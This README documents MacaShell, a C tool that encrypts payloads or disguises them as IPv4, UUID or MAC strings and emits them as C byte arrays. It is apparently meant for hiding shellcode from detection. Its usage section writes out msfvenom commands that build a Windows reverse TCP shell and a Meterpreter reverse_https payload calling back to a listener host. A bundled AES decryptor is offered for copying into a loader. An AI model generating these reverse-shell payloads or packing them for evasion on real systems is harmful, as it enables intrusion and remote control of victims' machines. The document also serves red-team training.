# MacaShell

"MacaShell is a command line tool that reads a raw binary or hex payload, encrypts or obfuscates it, and prints the result as a C byte array."

The output is always in this form:

    payload = { 0xde, 0xad, 0xbe, 0xef }

## Features

- AES-128, AES-192, AES-256 in CBC mode with a random IV (OpenSSL EVP)
- RC4 stream cipher
- Repeating-key XOR
- IPv4, IPv6, UUID and MAC address obfuscation
- Base64 encoding and decoding
- Round trips: the same tool decrypts and deobfuscates with -d

## Build

Debian / Ubuntu:

    sudo apt install libssl-dev
    gcc -Wall -Wextra -pedantic -std=c89 -o macashell main.c -lcrypto

Fedora:

    sudo dnf install openssl-devel
    gcc -Wall -Wextra -pedantic -std=c89 -o macashell main.c -lcrypto

Arch:

    sudo pacman -S openssl
    gcc -Wall -Wextra -pedantic -std=c89 -o macashell main.c -lcrypto

The code is strict C89 (ISO C90) and compiles warning free with the flags above.

## Usage

    You can generate payload with msfvenom, or provide your own:
    msfvenom -p <payload> <OPTIONS> -f <format> -o <output_file>

    Examples:
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.bin
    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=4444 -e x64/xor -i 3000 -f hex -o payload.hex

Then:

    macashell [options]

Input:

    -b,  --bin <file>      read raw binary file
    -0,  --hex <file>      read hex text or a 'payload = { ... }' file

Encryption techniques (takes a passphrase):

    -a128, --aes128 <pass> AES-128-CBC encryption
    -a192, --aes192 <pass> AES-192-CBC encryption
    -a256, --aes256 <pass> AES-256-CBC encryption
    -r,   --rc4 <pass>     RC4 stream cipher
    -x,   --xor <pass>     repeating-key XOR

Obfuscation techniques (no key):

    -4,   --ipv4           IPv4 quad obfuscation
    -6,   --ipv6           IPv6 address obfuscation
    -u,   --uuid           UUID obfuscation
    -m,   --mac            MAC address obfuscation
    -b64, --base64         Base64 encoding / obfuscation

Options:

    -d, --decrypt          deobfuscate / decrypt instead
    -h, --help             show usage help

## Examples

AES encrypt and decrypt:

    ./macashell -b payload.bin -a256 hunter2 > enc.txt
    ./macashell -0 enc.txt -a256 hunter2 -d > dec.txt

XOR, same shape:

    ./macashell -b payload.bin -x hunter2 > enc.txt
    ./macashell -0 enc.txt -x hunter2 -d > dec.txt

UUID obfuscation:

    ./macashell -b payload.bin -u > uuids.txt

## Decrypting / decoding outside the tool

The tool prints the payload as a hex C array. To decrypt outside the
tool, first convert that hex back into raw bytes: strip the
'payload = { }' wrapper, commas and '0x' prefixes, then parse each pair
of hex digits into a byte. The -0 loader does exactly this.

After that, every technique's raw bytes carry what is needed:

- AES-CBC: the first 16 bytes are the IV, the rest is PKCS#7 padded
  ciphertext.
- XOR and RC4: output length equals input length, the key is the passphrase.
- IPv4, IPv6, UUID, MAC: the first 4 bytes are the little endian original
  length, the rest is the encoded data with zero padding.

Passphrases are turned into AES keys by SHA-256: hash the passphrase and
take the first 16, 24 or 32 bytes depending on the AES variant.

The AES decryptor is small enough to copy into your own project and use
as a decryptor:

    #include <openssl/evp.h>
    #include <string.h>
    #include <stdlib.h>

    /* key must be 16, 24 or 32 bytes. payload is raw bytes: IV + ciphertext. */
    unsigned char *aes_decrypt(const unsigned char *key, int key_len,
                               const unsigned char *payload, size_t payload_len,
                               size_t *out_len)
    {
        EVP_CIPHER_CTX *ctx;
        const EVP_CIPHER *cipher;
        unsigned char *out;
        int len, final_len;

        if (key_len == 16) cipher = EVP_aes_128_cbc();
        else if (key_len == 24) cipher = EVP_aes_192_cbc();
        else if (key_len == 32) cipher = EVP_aes_256_cbc();
        else return NULL;

        out = malloc(payload_len - 16);
        if (!out) return NULL;

        ctx = EVP_CIPHER_CTX_new();
        EVP_DecryptInit_ex(ctx, cipher, NULL, key, payload);
        EVP_DecryptUpdate(ctx, out, &len, payload + 16, (int)(payload_len - 16));
        EVP_DecryptFinal_ex(ctx, out + len, &final_len);
        EVP_CIPHER_CTX_free(ctx);

        *out_len = (size_t)(len + final_len);
        return out;
    }

Link with -lcrypto.

For XOR and RC4, encrypting and decrypting are the same operation, so
run the same routine twice. For the obfuscation formats, decode the text
back into bytes (strip separators, parse hex pairs or decimal quads),
read the first 4 bytes as the length and take that many bytes from
offset 4. You can also copy the matching deobfuscate functions straight
from main.c and call them on the decoded payload.

## Base64 note

Base64 works on binary or hex input and is not a general purpose codec.
Decoding accepts the hex payload form only, not arbitrary base64 text.

## Security note

XOR and RC4 are obfuscation, not strong encryption. AES-CBC with a
passphrase is the only technique here meant for real secrecy, and even
then, treat this tool as a learning project, not audited software.
